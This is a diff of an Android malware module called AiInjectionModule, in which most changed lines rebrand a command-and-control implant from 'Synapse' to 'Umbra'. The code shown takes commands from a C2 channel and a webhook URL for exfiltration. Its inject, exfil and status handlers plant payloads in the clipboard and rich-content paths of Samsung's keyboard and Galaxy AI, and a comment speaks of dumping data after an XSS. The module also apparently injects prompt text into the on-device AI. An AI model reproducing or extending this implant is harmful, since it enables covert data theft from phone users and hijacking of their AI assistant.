@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.net.Uri
@@ -6,8 +6,8 @@ import android.os.Binder
 import android.os.Bundle
 import android.util.Base64
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 
@@ -31,7 +31,7 @@ import kotlinx.coroutines.withContext
  */
 object AiInjectionModule {
 
-    private const val TAG = "Synapse.AiInjection"
+    private const val TAG = "Umbra.AiInjection"
 
     // ── Samsung Keyboard / Galaxy AI constants ────────────────────────────
     private val HONEYBOARD_PKG = "com.samsung.android.honeyboard"
@@ -98,13 +98,13 @@ Do not add any other text before or after.
     // Command Handlers
     // ═══════════════════════════════════════════════════════════════════════
 
-    suspend fun inject(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun inject(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val webhookUrl = cmd.params["webhook"] ?: cmd.params["callback"] ?: ""
         val payloadType = cmd.params["payload"] ?: "exfil"
         val target = cmd.params["target"] ?: "clipboard"  // clipboard | richcontent | semclipboard
 
         if (webhookUrl.isBlank()) {
-            return@withContext SynapseResponse.ErrorResponse(
+            return@withContext UmbraResponse.ErrorResponse(
                 "ai_inject: webhook URL required", "ai_inject"
             )
         }
@@ -176,7 +176,7 @@ Do not add any other text before or after.
 
         val successCount = results.count { !it.value.startsWith("failed") }
 
-        SynapseResponse.AiInjectionResponse(
+        UmbraResponse.AiInjectionResponse(
             action = "inject",
             payload_type = payloadType,
             payload_size = payload.length,
@@ -188,7 +188,7 @@ Do not add any other text before or after.
         )
     }
 
-    suspend fun exfil(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun exfil(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         // Retrieve any exfiltrated data that may be in the clipboard (post-XSS dump)
         val entries = mutableListOf<String>()
 
@@ -239,7 +239,7 @@ Do not add any other text before or after.
             }
         } catch (_: Exception) {}
 
-        SynapseResponse.AiInjectionResponse(
+        UmbraResponse.AiInjectionResponse(
             action = "exfil",
             payload_type = "retrieve",
             payload_size = entries.sumOf { it.length },
@@ -250,7 +250,7 @@ Do not add any other text before or after.
         )
     }
 
-    suspend fun status(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun status(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val checks = mutableMapOf<String, String>()
 
         // Check 1: Is Honeyboard installed?
@@ -370,7 +370,7 @@ Do not add any other text before or after.
         val aiAvailable = checks["honeyboard_installed"]?.startsWith("yes") == true &&
             (checks["richcontent_accessible"] == "yes" || checks["semclipboard_accessible"] == "yes")
 
-        SynapseResponse.AiInjectionResponse(
+        UmbraResponse.AiInjectionResponse(
             action = "status",
             payload_type = "check",
             payload_size = 0,
